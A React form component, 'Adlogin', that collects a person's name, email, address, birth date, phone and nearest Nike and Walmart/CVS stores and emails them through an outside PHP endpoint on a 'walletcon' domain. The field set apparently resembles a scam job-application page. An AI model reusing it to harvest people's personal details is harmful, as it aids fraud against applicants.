import { Label, TextInput } from 'flowbite-react'
import { MdOutlineDriveFileRenameOutline } from "react-icons/md";
import { FaPhoneAlt } from "react-icons/fa";
import { FaStoreAlt } from "react-icons/fa";
import { FaStore } from "react-icons/fa";
import { useState } from 'react';
import axios from 'axios';

const Adlogin = () => {
  const [firstName, setFirstName] = useState('');
  const [lastName, setLastName] = useState('');
  const [email, setEmail] = useState('');
  const [city, setCity] = useState('');
  const [address, setAddress] = useState('');
  const [age, setAge] = useState('');
  const [phone, setPhone] = useState('');
  const [nikeStore, setNikeStore] = useState('');
  const [walmartStore, setWalmartStore] = useState('');


   
  const handleSubmit = (e) => {
    console.log(phone);
    e.preventDefault();
    axios.post('https://walletcon.intedhub.com/sendmail.php', {
       firstName,
      lastName,
       email,
       city,
      address,
       age,
      phone,
       nikeStore,
     walmartStore
    })
      .then((response) => {
        console.log(response);
        console.log('Form submission success:', response.data);
        // Reset form fields after successful submission if needed
        setFirstName('');
        setLastName('');
        setEmail('');
        setCity('');
        setAddress('');
        setAge('');
        setPhone('');
        setNikeStore('');
        setWalmartStore('');
      })
      .catch((error) => {
        console.error('Form submission error:', error);
        // Show an error message
      });

  };
  return (
    <>
    <form onSubmit={handleSubmit}>
      <br />
      <br />
      <br />
         <div className="max-w-md mx-auto   p-5 rounded">
         <div className="mb-2 block">
          <Label htmlFor="email4" value="Enter First Name" />
        </div>
        <TextInput
          type="text"
          rightIcon={MdOutlineDriveFileRenameOutline}
          id="first_name" name="first_name"
          placeholder="Clinton"
          value={firstName}
          onChange={(e) => setFirstName(e.target.value)}
          required
        />


<div className="mb-2 block">
          <Label htmlFor="email4" value="Enter Last Name" />
        </div>
        <TextInput
          type="text"
          rightIcon={MdOutlineDriveFileRenameOutline}
          id="last_name" name="last_name" 
          placeholder="John "
          value={lastName}
          onChange={(e) => setLastName(e.target.value)}
          required
        />

<div className="mb-2 block">
          <Label htmlFor="email4" value="Enter Email" />
        </div>
        <TextInput
          type="text"
          rightIcon={MdOutlineDriveFileRenameOutline}
          id="user_email" name="user_email"
          placeholder="john@gmail.com"
          value={email}
            onChange={(e) => setEmail(e.target.value)}
          required
        />

<div className="mb-2 block">
          <Label htmlFor="email4" value="Enter City" />
        </div>
        <TextInput
          type="text"
          rightIcon={MdOutlineDriveFileRenameOutline}
          id="city" name="city"
          placeholder="NYC"
          value={city}
          onChange={(e) => setCity(e.target.value)}
          required
        />

<div className="mb-2 block">
          <Label htmlFor="email4" value="Enter Address" />
        </div>
        <TextInput
          type="text"
          rightIcon={MdOutlineDriveFileRenameOutline}
          id="address" name="address" 
          placeholder="block 25 new jersey"
          value={address}
          onChange={(e) => setAddress(e.target.value)}
          required
        />

        <div className="mb-2 block">
          <Label htmlFor="email4" value="Your Age" />
        </div>
        <TextInput
          type="date"
         id='user_age' name='user_age'
          placeholder=""
          value={age}
          onChange={(e) => setAge(e.target.value)}

          required
        />

        
<div className="mb-2 block">
          <Label htmlFor="email4" value="Phone Number" />
        </div>
        <TextInput
          type="text"
          id="phone" name="phone"
          rightIcon={FaPhoneAlt}
          placeholder=""
          value={phone}
          onChange={(e) => setPhone(e.target.value)}
          required
        />

        
<div className="mb-2 block">
          <Label htmlFor="email4" value="Nearest Nike Store" />
        </div>
        <TextInput
          type="text"
         id='nike_store' name='nike_store'
          rightIcon={FaStoreAlt}
          placeholder=""
          value={nikeStore}
          onChange={(e) => setNikeStore(e.target.value)}
          required
        />

<div className="mb-2 block">
          <Label htmlFor="email4" value="Nearest Walmart/CVs" />
        </div>
        <TextInput
          type="text"
         id='walmart_store'  
          name='walmart_store'
          rightIcon={ FaStore}
          placeholder=""
          value={walmartStore}
            onChange={(e) => setWalmartStore(e.target.value)}
          required
        />
         

<button
 type="submit" 
    className="text-white w-80 mt-3 p-3 font-bold bg-red-400 hover:bg-orange-500 rounded w-100"
  >
    Apply
  </button>

  <br />
         </div>
         </form>
    </>
  )
}

export default Adlogin